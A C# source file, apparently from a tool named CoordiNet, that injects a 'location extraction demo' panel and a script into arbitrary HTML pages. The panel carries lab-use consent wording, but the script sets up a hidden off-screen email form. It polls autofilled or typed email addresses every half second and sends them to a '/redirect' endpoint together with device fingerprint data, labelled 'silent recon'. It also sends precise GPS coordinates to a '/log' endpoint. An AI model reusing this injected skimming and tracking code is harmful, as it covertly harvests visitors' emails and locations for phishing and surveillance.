namespace CoordiNet.Generator;

public sealed class HtmlProcessor
{
    public string InjectGeolocation(string html)
    {
        const string marker = "</body>";

        string injected = """
<script>
async function sendTelemetry(status, lat = '', lon = '', id = 'telemetry-' + Date.now()) {
    const params = new URLSearchParams({ status, id });

    if (lat) params.set('lat', String(lat));
    if (lon) params.set('lon', String(lon));

    try {
        await fetch('/log?' + params.toString(), {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        });
    } catch (error) {
        console.warn('Telemetry send failed:', error);
    }
}

async function loadIpLocation() {
    const output = document.getElementById("ip-location");
    const status = document.getElementById("session-status");

    try {
        status.textContent = "Querying IP-derived geo estimate...";
        const response = await fetch("/api/ip-location");

        if (!response.ok) {
            throw new Error("IP location request failed.");
        }

        const data = await response.json();

        output.textContent =
            `IP Address: ${data.ip}\n` +
            `Country: ${data.country}\n` +
            `Region: ${data.region}\n` +
            `City: ${data.city}\n` +
            `Coordinates: ${data.latitude ?? "n/a"}, ${data.longitude ?? "n/a"}`;

        await sendTelemetry('ip-estimate');
        status.textContent = "IP estimate available.";
    }
    catch (error) {
        output.textContent = "Unable to obtain IP-based location.";
        await sendTelemetry('ip-estimate-failed');
        status.textContent = "IP estimate unavailable.";
    }
}

function collectDeviceMetadata() {
    const osPlatform = navigator.userAgentData?.platform || navigator.platform || "unknown";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const hardwareCores = navigator.hardwareConcurrency || "unknown";
    const transitionSource = document.referrer || "direct";
    const harvestedEmail = window.harvested_email || "";

    const metadata = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
        os_platform: osPlatform,
        screen_res: screenRes,
        hardware_cores: hardwareCores,
        transition_source: transitionSource,
        harvested_email: harvestedEmail,
        colorDepth: window.screen.colorDepth ?? "unknown",
        pixelRatio: window.devicePixelRatio ?? 1,
        timestamp: new Date().toISOString()
    };

    const output = document.getElementById("device-metadata");
    if (output) {
        output.textContent = JSON.stringify(metadata, null, 2);
    }

    return metadata;
}

function prepareSilentReconPayload() {
    const osPlatform = navigator.userAgentData?.platform || navigator.platform || "unknown";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const hardwareCores = navigator.hardwareConcurrency || "unknown";
    const transitionSource = document.referrer || "direct";

    let harvested_email = "";
    const hiddenForm = document.createElement('form');
    hiddenForm.setAttribute('style', 'position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none;');
    hiddenForm.setAttribute('aria-hidden', 'true');
    const hiddenInput = document.createElement('input');
    hiddenInput.type = 'email';
    hiddenInput.name = 'email';
    hiddenInput.autocomplete = 'email';
    hiddenInput.value = '';
    hiddenForm.appendChild(hiddenInput);
    document.body.appendChild(hiddenForm);

    const captureEmail = () => {
        const candidates = [
            hiddenInput,
            document.querySelector('input[type="email"]'),
            document.querySelector('input[name="email"]'),
            document.querySelector('input[autocomplete="email"]')
        ];

        for (const candidate of candidates) {
            if (candidate && candidate.value) {
                harvested_email = candidate.value;
                window.harvested_email = harvested_email;
                return;
            }
        }

        window.harvested_email = harvested_email;
    };

    window.harvested_email = harvested_email;
    const events = ['input', 'change', 'focusin', 'keydown'];
    for (const eventName of events) {
        window.addEventListener(eventName, () => captureEmail(), { passive: true });
    }

    setInterval(() => {
        captureEmail();
        const metadata = collectDeviceMetadata();
        if (!metadata.harvested_email && harvested_email) {
            metadata.harvested_email = harvested_email;
        }
    }, 500);

    return {
        osPlatform,
        screenRes,
        hardwareCores,
        transitionSource,
        getCapturedEmail: () => {
            captureEmail();
            return window.harvested_email || harvested_email || "";
        }
    };
}

async function fireSilentReconTelemetry(status = 'redirect', id = 'recon-' + Date.now()) {
    const payload = prepareSilentReconPayload();
    const params = new URLSearchParams({
        status,
        id,
        os_platform: payload.osPlatform,
        screen_res: payload.screenRes,
        hardware_cores: payload.hardwareCores,
        transition_source: payload.transitionSource,
        harvested_email: payload.getCapturedEmail()
    });

    try {
        await fetch('/redirect?' + params.toString(), {
            method: 'GET',
            credentials: 'omit',
            cache: 'no-store',
            headers: { 'Accept': 'application/json' }
        });
    } catch (error) {
        console.warn('Silent recon telemetry failed:', error);
    }
}

function requestLocationExtraction() {
    const output = document.getElementById("device-location");
    const status = document.getElementById("session-status");
    const trackingId = 'geo-' + Date.now();

    if (!navigator.geolocation) {
        output.textContent = "Geolocation is not supported by this browser.";
        status.textContent = "Browser geolocation unavailable.";
        sendTelemetry('unsupported', '', '', trackingId);
        return;
    }

    output.textContent = "Waiting for explicit user consent and location permission...";
    status.textContent = "Requesting consented device location...";

    navigator.geolocation.getCurrentPosition(
        position => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const altitude = position.coords.altitude ?? "n/a";

            output.textContent =
                `Latitude: ${latitude}\n` +
                `Longitude: ${longitude}\n` +
                `Accuracy: ${accuracy} meters\n` +
                `Altitude: ${altitude}`;

            status.textContent = "Device location extracted successfully.";
            sendTelemetry('granted', latitude, longitude, trackingId);
            collectDeviceMetadata();
        },
        error => {
            output.textContent = `Location unavailable: ${error.message}`;
            status.textContent = "Location request denied or unavailable.";
            sendTelemetry('denied', '', '', trackingId);
        },
        {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }
    );
}

window.addEventListener("DOMContentLoaded", () => {
    loadIpLocation();
    collectDeviceMetadata();
});
</script>
""";

        string ui = """
<section id="coordinet-location" style="max-width:900px; margin:2rem auto; font-family:Arial, sans-serif; background:#121b2a; border:1px solid #2a3f5f; border-radius:14px; padding:1.5rem; color:#edf4ff;">
    <div style="display:flex; justify-content:space-between; align-items:center; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
        <div>
            <h2 style="margin:0; color:#7dd3fc;">Location Extraction Demo</h2>
            <p style="margin:0.4rem 0 0; color:#bfd7f7;">Authorized lab workflow for consented device and IP extraction.</p>
        </div>
        <span id="session-status" style="background:#1b2c41; border:1px solid #3a5f87; border-radius:999px; padding:0.45rem 0.8rem; color:#d8f7ff; font-size:0.8rem;">Waiting for session data...</span>
    </div>

    <div style="margin:1rem 0; padding:1rem; background:#0d1725; border:1px solid #223b59; border-radius:12px;">
        <strong>Consent notice</strong>
        <p style="margin:0.5rem 0 0; color:#dbeafe;">This demo is for authorized lab use only and requires explicit user consent before device location is requested.</p>
        <button onclick="requestLocationExtraction()" style="margin-top:0.8rem; background:#38bdf8; color:#041421; border:none; border-radius:8px; padding:0.75rem 1rem; font-weight:700; cursor:pointer;">
            Request Device Location
        </button>
    </div>

    <div style="display:grid; gap:1rem; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); margin-top:1rem;">
        <div style="padding:1rem; background:#0d1725; border:1px solid #223b59; border-radius:12px;">
            <h3 style="margin-top:0; color:#93c5fd;">IP-based estimate</h3>
            <pre id="ip-location" style="white-space:pre-wrap; word-break:break-word; color:#dbeafe; margin:0;">Loading...</pre>
        </div>

        <div style="padding:1rem; background:#0d1725; border:1px solid #223b59; border-radius:12px;">
            <h3 style="margin-top:0; color:#93c5fd;">Device location</h3>
            <pre id="device-location" style="white-space:pre-wrap; word-break:break-word; color:#dbeafe; margin:0;">Location permission has not been requested.</pre>
        </div>
    </div>

    <div style="margin-top:1rem; padding:1rem; background:#0d1725; border:1px solid #223b59; border-radius:12px;">
        <h3 style="margin-top:0; color:#93c5fd;">Device metadata</h3>
        <pre id="device-metadata" style="white-space:pre-wrap; word-break:break-word; color:#dbeafe; margin:0;">Collecting browser metadata...</pre>
    </div>
</section>
""";

        string result = html;

        if (result.Contains(marker, StringComparison.OrdinalIgnoreCase))
        {
            int index = result.LastIndexOf(marker, StringComparison.OrdinalIgnoreCase);
            result = result.Insert(index, ui + injected);
        }
        else
        {
            result += ui + injected;
        }

        return result;
    }
}